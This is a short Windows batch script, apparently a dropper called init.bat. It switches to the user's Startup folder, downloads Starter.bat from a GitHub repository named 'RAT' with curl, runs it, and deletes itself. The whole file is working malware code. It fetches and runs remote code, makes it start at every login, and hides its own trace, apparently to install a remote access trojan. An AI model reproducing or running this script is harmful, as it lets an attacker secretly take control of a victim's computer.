@echo off
set "currentd=%cd%"
@rem set "username=saifa"
set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %targetd%

curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat
Starter.bat
cd %currentd%
@del init.bat